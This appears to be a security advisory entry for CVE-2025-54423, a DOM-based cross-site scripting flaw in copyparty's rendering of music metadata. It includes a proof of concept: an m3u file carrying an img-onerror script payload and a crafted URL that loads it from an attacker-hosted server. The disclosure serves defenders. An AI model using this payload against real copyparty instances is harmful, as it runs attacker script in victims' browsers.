  - CVE-2025-54423
summary: "copyparty has DOM-Based XSS vulnerability when displaying multimedia metadata\n###\
  \ Summary\n\nAn unauthenticated attacker is able to execute arbitrary JavaScript code in a\
  \ victim's browser due to improper sanitization of multimedia tags in music files, including\
  \ `m3u` files.\n\n### Details\n\nMultimedia metadata is rendered in the web-app without sanitization.\
  \ This can be exploited in two ways:\n\n* a user which has the necessary permission for uploading\
  \ files can upload a song with an artist-name such as `<img src=x onerror=alert(document.domain)>`\n\
  * an unauthenticated user can trick another user into clicking a malicious URL, performing\
  \ this same exploit using an externally-hosted m3u file\n\nThe CVE score and PoC is based\
  \ on the m3u approach, which results in a higher severity.\n\n### PoC\n1.  Create a file named\
  \ `song.m3u` with the following content. Host this file on an attacker-controlled web server.\n\
  \n    ```m3u\n    #EXTM3U\n    #EXTINF:1,\"><img src=x onerror=alert(document.domain)> - \"\
  ><img src=x onerror=alert(document.domain)>\n    http://example.com/audio.mp3\n    ```\n\n\
  2.  Craft and share the malicious URL:  \n\n    ```\n    http://127.0.0.1:3923/#m3u=https://example.com/song.m3u\n\
  \    ```\n\n\n### Impact\nAny user that accesses this malicious URL is impacted."
